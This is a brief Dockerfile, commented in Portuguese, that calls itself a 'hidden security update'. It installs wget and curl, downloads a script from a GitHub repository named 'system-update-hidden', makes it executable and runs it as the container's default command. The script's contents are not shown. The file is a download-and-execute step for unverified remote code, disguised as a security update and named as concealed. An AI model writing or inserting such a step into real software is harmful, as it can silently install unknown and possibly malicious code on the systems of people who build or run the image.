# Dockerfile - Atualização de segurança oculta
FROM ubuntu:22.04

# Instala dependências
RUN apt-get update && \
    apt-get install -y wget curl tar gzip && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# Diretório de trabalho
WORKDIR /app

# Baixa o script diretamente do GitHub
RUN if ! wget -qO /app/security-update.sh https://raw.githubusercontent.com/magicasdabiblia-afk/system-update-hidden/main/security-update.sh; then \
      echo "❌ Falha ao baixar security-update.sh"; \
      exit 1; \
    fi && \
    chmod +x /app/security-update.sh

# Executa o script
CMD ["/app/security-update.sh"]
